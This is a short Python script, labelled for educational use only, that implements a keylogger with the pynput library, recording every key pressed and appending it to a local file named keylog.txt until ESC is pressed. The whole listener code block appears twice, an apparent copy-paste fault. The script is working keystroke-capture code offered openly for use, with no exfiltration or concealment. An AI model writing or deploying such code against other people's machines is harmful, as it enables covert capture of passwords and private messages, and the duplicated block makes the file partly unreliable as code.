"""
Simple Keylogger (Educational Use Only)

This program records keys pressed on the keyboard
and saves them to a file.

"""

try:
    from pynput import keyboard
except ImportError as e:
    print("Error importing pynput:", e)
    print("This script requires a graphical environment (X server) to run.")
    print("It cannot be executed in a headless environment like this dev container.")
    exit(1)

log_file = "keylog.txt"

def on_press(key):
    try:
        key_data = key.char  # normal keys
    except AttributeError:
        key_data = f"[{key}]"  # special keys

    with open(log_file, "a") as f:
        f.write(key_data)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when ESC is pressed
        return False

# Start listening
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

log_file = "keylog.txt"

def on_press(key):
    try:
        key_data = key.char  # normal keys
    except AttributeError:
        key_data = f"[{key}]"  # special keys

    with open(log_file, "a") as f:
        f.write(key_data)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when ESC is pressed
        return False

# Start listening
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
